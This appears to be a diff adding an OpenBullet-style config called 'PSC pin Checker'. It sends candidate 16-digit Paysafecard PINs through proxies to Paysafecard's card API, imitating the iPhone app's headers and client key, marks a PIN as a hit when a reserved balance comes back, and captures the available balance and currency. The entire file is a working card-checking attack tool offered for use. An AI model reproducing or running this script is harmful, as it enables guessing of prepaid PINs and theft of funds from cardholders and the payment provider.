@@ -1,0 +1,42 @@
+[SETTINGS]
+{
+  "Name": "PSC pin Checker",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-12T11:07:09.6729457+00:00",
+  "AdditionalInfo": "16digits pin with :a after it",
+  "Author": "Choempie",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+FUNCTION RandomNum 1 10000000 "" -> VAR "metrix" 
+REQUEST GET "https://rest.paysafecard.com/rest/card/pin?clientApplicationKey=ctCGqb4ue9G781egMcdnNOsnfIoSwssM&threatMetrixIdentifier=<metrix>" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: paysafecard/4.15 (iPhone; iOS 11.1; Scale/2.00)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-NewRelic-ID: VQECUVRSCxAIVVZQBAMFVw==" 
+  HEADER "CardPin: <USER>" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "reservedBalance" 
+  KEYCHAIN Failure OR 
+    KEY "does not exist" 
+    KEY "is already assigned to an account" 
+PARSE "<SOURCE>" JSON "availableBalance" Recursive=FALSE -> CAP "Balance" "" "" 
+PARSE "<SOURCE>" JSON "currencyCode" Recursive=FALSE -> CAP "" "" "" 
